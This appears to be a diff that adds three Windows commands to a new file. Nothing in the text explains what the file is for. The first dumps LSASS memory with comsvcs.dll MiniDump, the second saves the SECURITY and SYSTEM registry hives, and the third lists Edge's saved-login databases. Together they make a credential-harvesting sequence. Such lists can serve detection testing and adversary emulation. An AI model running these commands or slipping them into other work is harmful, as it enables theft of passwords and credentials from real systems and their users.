@@ -1,0 +1,3 @@
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\System32\lsass.dmp full
+reg save HKLM\SECURITY C:\Windows\System32\security.hiv /y; reg save HKLM\SYSTEM C:\Windows\System32\system.hiv /y
+Get-ChildItem "C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" | Select-Object FullName
